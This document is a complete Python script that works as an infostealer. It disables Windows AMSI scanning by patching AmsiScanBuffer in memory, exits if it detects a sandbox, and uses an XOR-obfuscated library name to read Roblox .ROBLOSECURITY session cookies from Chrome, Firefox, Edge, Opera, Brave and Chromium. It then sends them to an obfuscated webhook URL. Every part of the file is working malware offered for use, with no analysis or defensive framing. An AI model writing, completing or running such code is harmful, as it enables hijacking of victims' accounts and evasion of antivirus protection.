import os
import sys
import time
import ctypes
import ctypes.wintypes
import json
import importlib
from urllib.request import urlopen, Request
from urllib.error import URLError

_KEY = 0xAB

def _d(b: bytes) -> str:
    return bytes(c ^ _KEY for c in b).decode()

def _e(s: str) -> bytes:
    return bytes(ord(c) ^ _KEY for c in s)

def _lazy(name: str):
    return importlib.import_module(name)

_LIB_BC3  = bytes([0xC9, 0xCB, 0xD8, 0xDD, 0xDB, 0xD9, 0xD8, 0x9C, 0xC9, 0xD8, 0xD8, 0xDA, 0xD9, 0x9C, 0x9A])
_LIB_JSON = bytes([0xD8, 0xDB, 0xDD, 0xD8])

def patch_amsi():
    try:
        ctypes.windll.LoadLibrary("amsi.dll")
        addr = ctypes.cast(
            ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleW("amsi.dll"),
                b"AmsiScanBuffer"
            ),
            ctypes.c_void_p
        )
        if addr:
            patch = (ctypes.c_char * 6)(0x33, 0xC0, 0xC2, 0x08, 0x00, 0x90)
            old   = ctypes.wintypes.DWORD()
            ctypes.windll.kernel32.VirtualProtect(addr, 6, 0x40, ctypes.byref(old))
            ctypes.memmove(addr, patch, 6)
            ctypes.windll.kernel32.VirtualProtect(addr, 6, old, ctypes.byref(old))
    except Exception:
        pass

def is_sandbox() -> bool:
    try:
        if os.environ.get("USERNAME", "").lower() in {
            "sandbox", "virus", "malware", "analyst",
            "vmware", "test", "admin", "user"
        }:
            return True

        class _MS(ctypes.Structure):
            _fields_ = [
                ("dwLength",        ctypes.c_ulong),
                ("dwMemoryLoad",    ctypes.c_ulong),
                ("ullTotalPhys",    ctypes.c_ulonglong),
                ("ullAvailPhys",    ctypes.c_ulonglong),
                ("ullTotalPageFile",ctypes.c_ulonglong),
                ("ullAvailPageFile",ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtVirtual", ctypes.c_ulonglong),
            ]

        ms = _MS()
        ms.dwLength = ctypes.sizeof(ms)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(ms))
        if ms.ullTotalPhys < 2 * 1024 ** 3:
            return True

        t = time.time()
        time.sleep(1.5)
        if time.time() - t < 1.0:
            return True

    except Exception:
        pass
    return False

_WEBHOOK = bytes([0xc3,0xdf,0xdf,0xdb,0xd8,0x91,0x84,0x84,0xcf,0xc2,0xd8,0xc8,0xc4,0xd9,0xcf,0x85,0xc8,0xc4,0xc6,0x84,0xca,0xdb,0xc2,0x84,0xdc,0xce,0xc9,0xc3,0xc4,0xc4,0xc0,0xd8,0x84,0x9a,0x9e,0x9d,0x9f,0x9b,0x9c,0x98,0x92,0x9f,0x9e,0x9f,0x9b,0x9f,0x99,0x93,0x9b,0x93,0x9c,0x99,0x84,0xfb,0xd8,0xde,0xee,0x86,0xc3,0x99,0x9b,0xe1,0xff,0xea,0xee,0x9d,0xd3,0xc4,0xd3,0x99,0xe3,0xca,0xdd,0x92,0xcd,0x92,0xf2,0xec,0xe7,0xf9,0x9b,0xd1,0xe4,0xed,0xfa,0xea,0x9b,0x9e,0xc4,0xf3,0xe7,0xdc,0xea,0x9a,0xc9,0xe6,0x9c,0xd3,0xfb,0xc6,0x98,0xf1,0xef,0xe9,0xf2,0xc4,0xc8,0xfe,0x9a,0xf4,0xcf,0xc0,0xf4,0x93,0x9f,0x86,0xca,0xfb,0xc5,0xd2,0x93])

def send_webhook(content: str) -> None:
    url  = _d(_WEBHOOK)
    body = json.dumps({"content": f"```{content[:1900]}```"}).encode()
    req  = Request(url, data=body,
                   headers={"Content-Type": "application/json"},
                   method="POST")
    try:
        urlopen(req, timeout=10)
    except URLError:
        pass

def steal_cookies() -> str:
    bc3 = _lazy(_d(_LIB_BC3))
    results = []

    browsers = {
        "chrome":   bc3.chrome,
        "firefox":  bc3.firefox,
        "edge":     bc3.edge,
        "opera":    bc3.opera,
        "opera_gx": bc3.opera_gx,
        "brave":    bc3.brave,
        "chromium": bc3.chromium,
    }

    for name, loader in browsers.items():
        try:
            jar = loader(domain_name="roblox.com")
            for cookie in jar:
                if cookie.name == ".ROBLOSECURITY":
                    results.append(f"{name} | {cookie.value}")
        except Exception:
            continue

    return "\n".join(results) if results else "no cookies"

if __name__ == "__main__":
    patch_amsi()
    if is_sandbox():
        sys.exit(0)

    cookies = steal_cookies()
    send_webhook(cookies)
